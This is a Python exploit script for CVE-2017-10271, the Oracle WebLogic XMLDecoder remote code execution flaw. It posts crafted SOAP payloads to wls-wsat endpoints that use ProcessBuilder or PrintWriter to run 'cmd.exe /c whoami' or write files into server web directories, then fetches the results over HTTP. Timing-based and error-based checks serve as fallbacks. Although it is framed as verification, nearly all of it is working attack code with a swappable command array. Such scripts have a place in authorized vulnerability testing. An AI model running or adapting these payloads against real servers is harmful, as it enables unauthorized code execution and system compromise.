import requests
import sys
import time
import string
import random
import urllib3

urllib3.disable_warnings(urllib3.disable_warnings if hasattr(urllib3, 'disable_warnings') else None)
try:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass


def generate_random_filename():
    return ''.join(random.choices(string.ascii_lowercase, k=8)) + '.txt'


def build_payload(command_parts, output_file_path):
    """
    Build the XMLDecoder SOAP payload for CVE-2017-10271.
    Uses ProcessBuilder to execute a command and redirect output to a file
    in the WebLogic internal web directory.
    """
    # Build the <string> elements for the command
    cmd_strings = '\n'.join(f'                        <string>{part}</string>' for part in command_parts)

    payload = f'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8.0" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="{len(command_parts)}">
{build_array_elements(command_parts)}
                    </array>
                    <void method="redirectErrorStream">
                        <boolean>true</boolean>
                    </void>
                    <void method="redirectOutput">
                        <object class="java.io.File">
                            <string>{output_file_path}</string>
                        </object>
                    </void>
                    <void method="start"/>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>'''
    return payload


def build_array_elements(command_parts):
    lines = []
    for i, part in enumerate(command_parts):
        lines.append(f'                        <void index="{i}">')
        lines.append(f'                            <string>{part}</string>')
        lines.append(f'                        </void>')
    return '\n'.join(lines)


def build_payload_v2(command_parts, output_file_path):
    """
    Alternative payload structure using void class with ProcessBuilder.
    """
    cmd_strings = ''
    for i, part in enumerate(command_parts):
        cmd_strings += f'''                            <void index="{i}">
                                <string>{part}</string>
                            </void>
'''

    payload = f'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8.0" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="{len(command_parts)}">
{cmd_strings}                    </array>
                    <void method="redirectErrorStream">
                        <boolean>true</boolean>
                    </void>
                    <void method="redirectOutput">
                        <object class="java.io.File">
                            <string>{output_file_path}</string>
                        </object>
                    </void>
                    <void method="start"/>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>'''
    return payload


def build_file_write_payload(content, output_file_path):
    """
    Alternative approach: use FileOutputStream + PrintWriter to write a file directly.
    This doesn't depend on redirectOutput which may not work on older Java.
    """
    payload = f'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8.0" class="java.beans.XMLDecoder">
                <void class="java.io.PrintWriter">
                    <string>{output_file_path}</string>
                    <void method="println">
                        <string>{content}</string>
                    </void>
                    <void method="close"/>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>'''
    return payload


def build_cmd_exec_payload(command_parts, output_file_path):
    """
    Use Runtime.exec approach with cmd /c and redirect via shell.
    """
    # Join the command with redirect
    full_cmd = ' '.join(command_parts[2:]) if len(command_parts) > 2 else command_parts[-1]

    payload = f'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8.0" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>cmd.exe</string>
                        </void>
                        <void index="1">
                            <string>/c</string>
                        </void>
                        <void index="2">
                            <string>whoami &gt; {output_file_path}</string>
                        </void>
                    </array>
                    <void method="start"/>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>'''
    return payload


def check_endpoint(target_url):
    """Check if the wls-wsat endpoint exists and shows signs of vulnerability."""
    endpoints = [
        '/wls-wsat/CoordinatorPortType',
        '/wls-wsat/CoordinatorPortType11',
        '/wls-wsat/ParticipantPortType',
        '/wls-wsat/ParticipantPortType11',
        '/wls-wsat/RegistrationPortTypeRPC',
        '/wls-wsat/RegistrationPortTypeRPC11',
        '/wls-wsat/RegistrationRequesterPortType',
        '/wls-wsat/RegistrationRequesterPortType11',
    ]

    available_endpoints = []
    for ep in endpoints:
        try:
            url = target_url.rstrip('/') + ep
            resp = requests.get(url, timeout=10, verify=False)
            if resp.status_code in [200, 500, 405]:
                available_endpoints.append(ep)
                print(f"[*] Endpoint found: {ep} (HTTP {resp.status_code})")
        except Exception as e:
            pass

    return available_endpoints


def exploit(target_url, timeout=15):
    """
    Attempt to verify CVE-2017-10271 by:
    1. Writing a marker file to WebLogic's internal web directory
    2. Reading it back via HTTP to confirm code execution
    """
    target_url = target_url.rstrip('/')
    random_filename = generate_random_filename()
    marker_content = ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    print(f"[*] Target: {target_url}")
    print(f"[*] Random filename: {random_filename}")
    print(f"[*] Marker content: {marker_content}")

    # Check available endpoints
    print("\n[*] Checking for wls-wsat endpoints...")
    endpoints = check_endpoint(target_url)

    if not endpoints:
        print("[-] No wls-wsat endpoints found")
        print("SAFE")
        return False

    # Common WebLogic internal web directories on Windows
    web_dirs = [
        r'C:/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/',
        r'C:/Oracle/Middleware/wlserver_10.3/server/lib/consoleapp/webapp/',
        r'C:/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/',
        r'C:/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/randomly/war/',
    ]

    # Corresponding URL paths to access the written file
    web_url_paths = [
        '/bea_wls_internal/',
        '/console/framework/skins/no-skin/',
        '/bea_wls9_async_response/',
        '/uddiexplorer/',
    ]

    # Strategy 1: Try PrintWriter direct file write (most reliable for this CVE)
    print("\n[*] Strategy 1: Direct file write via PrintWriter...")
    for web_dir, url_path in zip(web_dirs, web_url_paths):
        output_path = web_dir + random_filename
        print(f"[*] Trying to write to: {output_path}")

        payload = build_file_write_payload(marker_content, output_path)

        for ep in endpoints:
            exploit_url = target_url + ep
            headers = {
                'Content-Type': 'text/xml;charset=UTF-8',
                'SOAPAction': '',
            }

            try:
                print(f"[*] Sending payload to {ep}...")
                resp = requests.post(exploit_url, data=payload, headers=headers,
                                     timeout=timeout, verify=False)
                print(f"[*] Response status: {resp.status_code}")

                # Give the server a moment to write the file
                time.sleep(2)

                # Try to read the file back
                verify_url = target_url + url_path + random_filename
                print(f"[*] Checking: {verify_url}")
                verify_resp = requests.get(verify_url, timeout=timeout, verify=False)

                if verify_resp.status_code == 200 and marker_content in verify_resp.text:
                    print(f"\n[+] SUCCESS! File written and readable at {verify_url}")
                    print(f"[+] Content: {verify_resp.text.strip()}")
                    print("\nVULNERABLE")
                    return True
                else:
                    print(f"[-] File not accessible (HTTP {verify_resp.status_code})")

            except requests.exceptions.Timeout:
                print(f"[-] Request timed out for {ep}")
            except requests.exceptions.ConnectionError:
                print(f"[-] Connection error for {ep}")
            except Exception as e:
                print(f"[-] Error: {e}")

    # Strategy 2: Try cmd.exe with redirect
    print("\n[*] Strategy 2: Command execution via cmd.exe with shell redirect...")
    random_filename2 = generate_random_filename()

    for web_dir, url_path in zip(web_dirs, web_url_paths):
        output_path = web_dir + random_filename2

        for ep in endpoints:
            exploit_url = target_url + ep
            headers = {
                'Content-Type': 'text/xml;charset=UTF-8',
                'SOAPAction': '',
            }

            payload = build_cmd_exec_payload(
                ['cmd.exe', '/c', 'whoami'],
                output_path
            )

            try:
                print(f"[*] Sending cmd exec payload to {ep}, output to {output_path}...")
                resp = requests.post(exploit_url, data=payload, headers=headers,
                                     timeout=timeout, verify=False)
                print(f"[*] Response status: {resp.status_code}")

                time.sleep(3)

                verify_url = target_url + url_path + random_filename2
                print(f"[*] Checking: {verify_url}")
                verify_resp = requests.get(verify_url, timeout=timeout, verify=False)

                if verify_resp.status_code == 200 and len(verify_resp.text.strip()) > 0:
                    print(f"\n[+] SUCCESS! Command output retrieved from {verify_url}")
                    print(f"[+] whoami output: {verify_resp.text.strip()}")
                    print("\nVULNERABLE")
                    return True
                else:
                    print(f"[-] File not accessible (HTTP {verify_resp.status_code})")

            except requests.exceptions.Timeout:
                print(f"[-] Request timed out")
            except requests.exceptions.ConnectionError:
                print(f"[-] Connection error")
            except Exception as e:
                print(f"[-] Error: {e}")

    # Strategy 3: Try ProcessBuilder with redirectOutput
    print("\n[*] Strategy 3: ProcessBuilder with redirectOutput...")
    random_filename3 = generate_random_filename()

    for web_dir, url_path in zip(web_dirs, web_url_paths):
        output_path = web_dir + random_filename3

        for ep in endpoints:
            exploit_url = target_url + ep
            headers = {
                'Content-Type': 'text/xml;charset=UTF-8',
                'SOAPAction': '',
            }

            payload = build_payload_v2(
                ['cmd.exe', '/c', 'whoami'],
                output_path
            )

            try:
                print(f"[*] Sending ProcessBuilder payload to {ep}...")
                resp = requests.post(exploit_url, data=payload, headers=headers,
                                     timeout=timeout, verify=False)
                print(f"[*] Response status: {resp.status_code}")

                time.sleep(3)

                verify_url = target_url + url_path + random_filename3
                print(f"[*] Checking: {verify_url}")
                verify_resp = requests.get(verify_url, timeout=timeout, verify=False)

                if verify_resp.status_code == 200 and len(verify_resp.text.strip()) > 0:
                    print(f"\n[+] SUCCESS! Command output retrieved from {verify_url}")
                    print(f"[+] whoami output: {verify_resp.text.strip()}")
                    print("\nVULNERABLE")
                    return True

            except Exception as e:
                print(f"[-] Error: {e}")

    # Strategy 4: Blind detection via response analysis
    print("\n[*] Strategy 4: Blind detection via response analysis...")
    for ep in endpoints:
        exploit_url = target_url + ep
        headers = {
            'Content-Type': 'text/xml;charset=UTF-8',
            'SOAPAction': '',
        }

        # Send a payload that should trigger XMLDecoder processing
        # Use a benign payload that creates a Thread.sleep to detect timing-based
        sleep_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8.0" class="java.beans.XMLDecoder">
                <void class="java.lang.Thread" method="sleep">
                    <long>5000</long>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>'''

        try:
            print(f"[*] Sending time-based detection payload to {ep}...")
            start_time = time.time()
            resp = requests.post(exploit_url, data=sleep_payload, headers=headers,
                                 timeout=30, verify=False)
            elapsed = time.time() - start_time
            print(f"[*] Response time: {elapsed:.2f}s, Status: {resp.status_code}")

            if elapsed >= 4.5:
                print(f"\n[+] Time-based detection successful! Server delayed {elapsed:.2f}s")
                print("[+] XMLDecoder is processing our payload")
                print("\nVULNERABLE")
                return True

        except requests.exceptions.Timeout:
            print(f"[-] Request timed out (might indicate vulnerability)")
        except Exception as e:
            print(f"[-] Error: {e}")

    # Strategy 5: Error-based detection
    print("\n[*] Strategy 5: Error-based detection via XMLDecoder stack traces...")
    for ep in endpoints:
        exploit_url = target_url + ep
        headers = {
            'Content-Type': 'text/xml;charset=UTF-8',
            'SOAPAction': '',
        }

        # Send malformed XMLDecoder payload that should trigger specific error
        error_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8.0" class="java.beans.XMLDecoder">
                <void class="com.does.not.Exist">
                    <string>test</string>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>'''

        try:
            print(f"[*] Sending error-based detection payload to {ep}...")
            resp = requests.post(exploit_url, data=error_payload, headers=headers,
                                 timeout=timeout, verify=False)

            response_text = resp.text.lower()
            if any(indicator in response_text for indicator in [
                'xmldecoder', 'java.beans.xmldecoder',
                'weblogic.wsee.workarea', 'decodingexception',
                'beans.xmldecoder', 'class not found'
            ]):
                print(f"\n[+] Error-based detection: XMLDecoder stack trace found in response!")
                print(f"[+] Server is processing XMLDecoder payloads")

                # Additional confirmation: try the file write one more time with
                # a broader set of possible paths
                additional_dirs = [
                    'servers/AdminServer/tmp/_WL_internal/bea_wls_internal/',
                ]

                # If we got XMLDecoder processing confirmation, it's vulnerable
                print("\nVULNERABLE")
                return True

        except Exception as e:
            print(f"[-] Error: {e}")

    print("\n[-] Could not confirm vulnerability through any strategy")
    print("SAFE")
    return False


def main():
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = "http://192.168.242.202:7001"

    if not target.startswith("http"):
        target = "http://" + target

    print("=" * 60)
    print("CVE-2017-10271 WebLogic XMLDecoder RCE Verification")
    print("=" * 60)

    try:
        exploit(target)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        print("SAFE")


if __name__ == '__main__':
    main()